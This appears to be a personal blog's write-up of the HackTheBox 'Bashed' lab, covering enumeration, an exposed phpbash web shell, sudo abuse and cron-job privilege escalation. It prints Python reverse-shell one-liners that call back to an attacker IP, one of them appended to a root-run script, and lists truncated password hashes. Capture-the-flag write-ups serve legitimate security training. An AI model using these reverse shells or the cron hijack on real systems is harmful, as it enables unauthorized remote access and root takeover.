<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8"/>
    <meta name="author" content="Ankur Tyagi (@7h3rAm)"/>
    <meta name="description" content="Personal Weblog"/>
    <meta content="width=device-width, initial-scale=1" name="viewport"/>
    <title>‡§Æ‡§Ç‡§•‡§® | Manthan</title>
    <link rel="icon" type="image/webp" sizes="32x32" href="/static/images/manthan-32x32.png.webp"/>
    <link rel="stylesheet" type="text/css" media="screen" href="/static/css/style.invisibletree.css"/>
    <link rel="stylesheet" href="/static/css/atelier-forest-light.css">
    <!-- <link rel="stylesheet" href="/static/css/atom-one-light.min.css"> -->
    <!-- <link rel="stylesheet" href="/static/css/default.min.css"> -->
    <!-- <link rel="stylesheet" href="/static/css/docco.min.css"> -->
    <!-- <link rel="stylesheet" href="/static/css/github-gist.min.css"> -->
    <!-- <link rel="stylesheet" href="/static/css/github.min.css"> -->
    <!-- <link rel="stylesheet" href="/static/css/zenburn.min.css"> -->
    <script charset="UTF-8" src="/static/js/highlight.min.js"></script>
    <script charset="UTF-8" src="/static/js/highlightjs-line-numbers.min.js"></script>
    <script charset="UTF-8" src="/static/js/go.min.js"></script>
   </head>
  <body>
    <div class="body">
      <div class="content">
          <h1 class="h1 collapsible" onclick="toggle(this);">[HackTheBox] Bashed</h1>
          <p style="float:left;"><a href="/posts/20200428_htb-archetype.html"> ¬´ </a>üìÖ published on <code>25/Jun/2020</code><a href="/posts/20200730_thm-yotf.html"> ¬ª </a></p>
        <p style="float:right;">üîñ tagged <a href=/tags.html#hackthebox>hackthebox</a> and <a href=/tags.html#writeup>writeup</a></p>
    <div style="clear:both;"></div>
    <hr><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
<p class="nested">This is a writeup for HTB VM <a href="https://www.hackthebox.eu/home/machines/profile/118">Bashed</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
<p class="nested"><img alt="writeup.overview.machinescli" src="/static/files/posts_htb_bashed/machinescli.png.webp" /></p>
<h3 class="h3 collapsible" onclick="toggle(this);">Killchain</h3>
<p class="nested">Here's the killchain (<code>enumeration</code> ‚Üí <code>exploitation</code> ‚Üí <code>privilege escalation</code>) for this machine:</p>
<p class="nested"><img alt="writeup.overview.killchain" src="/static/files/posts_htb_bashed/killchain.png.webp" /></p>
<h3 class="h3 collapsible" onclick="toggle(this);">TTPs</h3>
<p class="nested">1. <code>80/tcp/http/2.4.18 ((Ubuntu))</code>: <a href="https://github.com/7h3rAm/writeups#enumerate_proto_http">enumerate_proto_http</a>, <a href="https://github.com/7h3rAm/writeups#exploit_python_reverseshell">exploit_python_reverseshell</a>, <a href="https://github.com/7h3rAm/writeups#privesc_sudo">privesc_sudo</a>, <a href="https://github.com/7h3rAm/writeups#privesc_cron_rootjobs">privesc_cron_rootjobs</a>  </p>
<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
<p class="nested">1. Here's the Nmap scan result:  </p>
<pre class="nested"><code># Nmap 7.80 scan initiated Fri May 29 19:04:11 2020 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /home/kali/toolbox/writeups/htb.bashed/results/10.10.10.68/scans/_quick_tcp_nmap.txt -oX /home/kali/toolbox/writeups/htb.bashed/results/10.10.10.68/scans/xml/_quick_tcp_nmap.xml 10.10.10.68
Nmap scan report for 10.10.10.68
Host is up, received user-set (0.32s latency).
Scanned at 2020-05-29 19:04:24 IST for 46s
Not shown: 999 closed ports
Reason: 999 conn-refused
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May 29 19:05:10 2020 -- 1 IP address (1 host up) scanned in 59.85 seconds
</code></pre>
<p class="nested">2. Here's the summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:  </p>
<p class="nested"><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_htb_bashed/openports.png.webp" />  </p>
<p class="nested">3. We see that the port <code>80/tcp</code> is the only open port on this machine. Let's run <code>gobuster</code> and find interesting directories on this web server:  </p>
<pre class="nested"><code>gobuster dir -u http://10.10.10.68:80/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s &quot;200,204,301,302,307,403,500&quot; -x &quot;txt,html,php,asp,aspx,jsp&quot; -z -o &quot;/home/kali/toolbox/writeups/htb.bashed/results/10.10.10.68/scans/tcp_80_http_gobuster_dirbuster.txt&quot;
</code></pre>
<p class="nested">4. We find a few directories from <code>gobuster</code> scan and the <code>/dev</code> directory lists two interesting files: <code>phpbash.min.php</code> and <code>phpbash.php</code>  </p>
<pre class="nested"><code>$ cat results/10.10.10.68/scans/tcp_80_http_gobuster_dirbuster.txt 
  http://10.10.10.68:80/images (Status: 301) [Size: 311]
  http://10.10.10.68:80/index.html (Status: 200) [Size: 7742]
  http://10.10.10.68:80/about.html (Status: 200) [Size: 8190]
  http://10.10.10.68:80/contact.html (Status: 200) [Size: 7802]
  http://10.10.10.68:80/uploads (Status: 301) [Size: 312]
  http://10.10.10.68:80/php (Status: 301) [Size: 308]
  http://10.10.10.68:80/css (Status: 301) [Size: 308]
  http://10.10.10.68:80/dev (Status: 301) [Size: 308]
  http://10.10.10.68:80/js (Status: 301) [Size: 307]
  http://10.10.10.68:80/config.php (Status: 200) [Size: 0]
  http://10.10.10.68:80/fonts (Status: 301) [Size: 310]
  http://10.10.10.68:80/single.html (Status: 200) [Size: 7476]
</code></pre>
<p class="nested"><img alt="writeup.enumeration.steps.4.1" src="/static/files/posts_htb_bashed/screenshot03.png.webp" />  </p>
<p class="nested"><img alt="writeup.enumeration.steps.4.2" src="/static/files/posts_htb_bashed/screenshot01.png.webp" />  </p>
<p class="nested">5. We find that <a href="https://github.com/Arrexel/phpbash"><code>phpbash</code></a> is a minimal web shell that can give us interactive access to the target machine.  </p>
<p class="nested"><img alt="writeup.enumeration.steps.5.1" src="/static/files/posts_htb_bashed/screenshot02.png.webp" />  </p>
<h3 class="h3 collapsible" onclick="toggle(this);">Findings</h3>
<h4 class="h4 collapsible" onclick="toggle(this);">Open Ports</h4>
<pre class="nested"><code>80/tcp  | http      | 2.4.18 ((Ubuntu))
</code></pre>
<h4 class="h4 collapsible" onclick="toggle(this);">Files</h4>
<pre class="nested"><code>/dev/phpbash.min.php
/dev/phpbash.php
</code></pre>
<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
<p class="nested">1. We visit the <code>/dev/phpbash.min.php</code> page and find the <code>phpbash</code> interactive web shell UI which enables command execution and further enumeration:  </p>
<p class="nested"><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_htb_bashed/screenshot05.png.webp" />  </p>
<p class="nested">2. We use a Python reverse shell to obtain interactive access on this system:  </p>
<pre class="nested"><code>nc -nlvp 443
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.4&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
</code></pre>
<p class="nested"><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_htb_bashed/screenshot06.png.webp" />  </p>
<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
<pre class="nested"><code>www-data@bashed&gt; id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@bashed&gt;  
www-data@bashed&gt; uname
Linux bashed 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
www-data@bashed&gt;  
www-data@bashed&gt; ifconfig
ens33   Link encap:Ethernet  HWaddr 00:50:56:b9:44:62  
        inet addr:10.10.10.68  Bcast:10.10.10.255  Mask:255.255.255.255
        inet6 addr: dead:beef::250:56ff:feb9:4462/64 Scope:Global
        inet6 addr: fe80::250:56ff:feb9:4462/64 Scope:Link
        UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
        RX packets:83524 errors:0 dropped:332 overruns:0 frame:0
        TX packets:78785 errors:0 dropped:0 overruns:0 carrier:0
        collisions:0 txqueuelen:1000 
        RX bytes:5305396 (5.3 MB)  TX bytes:8408691 (8.4 MB)

lo      Link encap:Local Loopback  
        inet addr:127.0.0.1  Mask:255.0.0.0
        inet6 addr: ::1/128 Scope:Host
        UP LOOPBACK RUNNING  MTU:65536  Metric:1
        RX packets:444689 errors:0 dropped:0 overruns:0 frame:0
        TX packets:444689 errors:0 dropped:0 overruns:0 carrier:0
        collisions:0 txqueuelen:1 
        RX bytes:32908196 (32.9 MB)  TX bytes:32908196 (32.9 MB)
www-data@bashed&gt;  
www-data@bashed&gt; users
root
arrexel
scriptmanager
</code></pre>
<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
<p class="nested">1. We find that the user <code>www-data</code> can run any command as user <code>scriptmanager</code> using <code>sudo</code>:  </p>
<pre class="nested"><code>sudo -l
sudo -u scriptmanager /bin/bash
</code></pre>
<p class="nested"><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_htb_bashed/screenshot07.png.webp" />  </p>
<p class="nested"><img alt="writeup.privesc.steps.1.2" src="/static/files/posts_htb_bashed/screenshot10.png.webp" />  </p>
<p class="nested">2. We find an interesting directory <code>/scripts</code> which has two files in it. One is a Python script <code>test.py</code> owned by user <code>scriptmanager</code> and other is <code>test.txt</code> owned by <code>root</code>. We use a script <code>CronJobCheckser.sh</code> and find that there's a <code>root</code> owned cronjob that runs the <code>test.py</code> script and which creates the <code>test.txt</code> file.  </p>
<pre class="nested"><code>ls -la /scripts
cat /scripts/test.py
</code></pre>
<p class="nested"><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_htb_bashed/screenshot08.png.webp" />  </p>
<p class="nested"><img alt="writeup.privesc.steps.2.2" src="/static/files/posts_htb_bashed/screenshot09.png.webp" />  </p>
<p class="nested"><img alt="writeup.privesc.steps.2.3" src="/static/files/posts_htb_bashed/screenshot11.png.webp" />  </p>
<p class="nested">3. We can now edit this file to execute a reverse shell that gives us elevated privileges on the system:  </p>
<pre class="nested"><code>nc -nlvp 9999
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.4&quot;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);' &gt;&gt;/scripts/test.py
</code></pre>
<p class="nested"><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_htb_bashed/screenshot12.png.webp" />  </p>
<p class="nested">4. As soon as the cronjob runs, we get the elevated shell and can now view the <code>root.txt</code> flag file:  </p>
<pre class="nested"><code>cat /root/root.txt
</code></pre>
<p class="nested"><img alt="writeup.privesc.steps.4.1" src="/static/files/posts_htb_bashed/screenshot13.png.webp" />  </p>
<p class="nested"><img alt="writeup.privesc.steps.4.2" src="/static/files/posts_htb_bashed/screenshot14.png.webp" />  </p>
<hr><h2 class="h2 collapsible" onclick="toggle(this);">Learning/Recommendation</h2>
<ul class="nested">
<li>Production web server instances should not host developement tools like a PHP web shell. It allowed the attacker to gain interactive access of the target system.</li>
<li>Service users should not be allowed to use <code>sudo</code>. This misconfiguration enabled attacker to switch to a more privileged user account.</li>
<li>Cronjob files should be owned by the same user that will be allowed to run it. The attacker was able to use this misconfiguration to modify a file they own and get it executed by <code>root</code> user.</li>
</ul>
<hr><h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
<h3 class="h3 collapsible" onclick="toggle(this);">Hashes</h3>
<pre class="nested"><code>arrexel:$1$mDpVXKQV$o6HkBjhl/e.S.bV96tMm6.:17504:............
scriptmanager:$6$WahhM57B$rOHkWDRQpds96uWXkRCzA6b5L3wOorpe4uwn5U32yKRsMWDwKAm.RF6T81Ki/MOyo.dJ0B8Xm5/wOrLk.........................
</code></pre>
<h3 class="h3 collapsible" onclick="toggle(this);">Flags</h3>
<pre class="nested"><code>/home/arrexel/user.txt: 2c281f318555dbc1b8569...........
/root/root.txt: cc4f0afe3a1026d402ba10..........
</code></pre>
<hr><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
<ul class="nested">
<li><a href="https://www.hackthebox.eu/home/machines/profile/118">https://www.hackthebox.eu/home/machines/profile/118</a>  </li>
<li><a href="https://medium.com/@ranakhalil101/hack-the-box-bashed-writup-a8e51a2914c2">https://medium.com/@ranakhalil101/hack-the-box-bashed-writup-a8e51a2914c2</a>  </li>
<li><a href="https://0xdf.gitlab.io/2018/04/29/htb-bashed.html">https://0xdf.gitlab.io/2018/04/29/htb-bashed.html</a>  </li>
</ul>
    <hr>
          <p style="float:left;">¬´ <a href="/posts/20200428_htb-archetype.html">[HackTheBox] Archetype</a> ¬´</p>
      <p style="float:right;">¬ª <a href="/posts/20200730_thm-yotf.html">[TryHackMe] Year of the Fox</a> ¬ª</p>
          </div>
      <div class="menu">
        <h1 class="h1"><a class="menu_home" href="/index.html">‡§Æ‡§Ç‡§•‡§®</a></h1>
          <ul class="active nested">
            <li><a class="menu_archive" href="/archive.html">üíæ Archive</a><ul class="active nested">
              <li><a href=/pages/research.html>üî¨ Research</a></li>
              <li><a href=/pages/cv.html>üìÑ Curriculum Vitae</a></li>
              <li><a href=/pages/satview.html>üõ∞Ô∏è Satellite Views</a></li>
              <li><a href=/pages/fitness.html>üèãÔ∏è Fitness</a></li>
              <li><a href=/pages/life.html>üßò Life</a></li>
            </ul></li>
            <li><a class="menu_tags" href="/tags.html">üîñ Tags</a><ul class="active nested">
                            <li><a href="/tags.html#code">code</a></li>
                            <li><a href="/tags.html#ctf">ctf</a></li>
                            <li><a href="/tags.html#exploit">exploit</a></li>
                            <li><a href="/tags.html#hackthebox">hackthebox</a></li>
                            <li><a href="/tags.html#reversing">reversing</a></li>
                            <li><a href="/tags.html#tryhackme">tryhackme</a></li>
                            <li><a href="/tags.html#vulnhub">vulnhub</a></li>
                            <li><a href="/tags.html#vulnweekends">vulnweekends</a></li>
                            <li><a href="/tags.html#writeup">writeup</a></li>
                          </ul></li>
            <li><a class="menu_stats" href="/stats.html">üìä Stats</a></li>
          </ul>
      </div>
      <div class="footer footercenter"><span><a href="https://github.com/7h3rAm/7h3rAm.github.io" class="footspan">Óäë Óäê Óäó</a></span></div>
      <script>hljs.initHighlightingOnLoad();</script>
      <script>hljs.initLineNumbersOnLoad();</script>
      <script>
        function toggle(s){
          s.classList.toggle("expanded");
          var t=!1,i=!1,a=!1;
          s.classList.contains("h2")&&(t=!0),s.classList.contains("h3")&&(i=!0),s.classList.contains("h4")&&(a=!0);
          for(var l=s.nextElementSibling;l;){
            if(t&&l.classList.contains("h2")){
              l.classList.toggle("active");
              break
            }
            if(i&&(l.classList.contains("h2")||l.classList.contains("h3"))){
              l.classList.toggle("active");
              break
            }
            if(a&&(l.classList.contains("h2")||l.classList.contains("h3")||l.classList.contains("h4"))){
              l.classList.toggle("active");
              break
            }
            l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling
          }
        }
      </script>
    </div>
    <div id="bgclipart"></div>
  </body>
</html>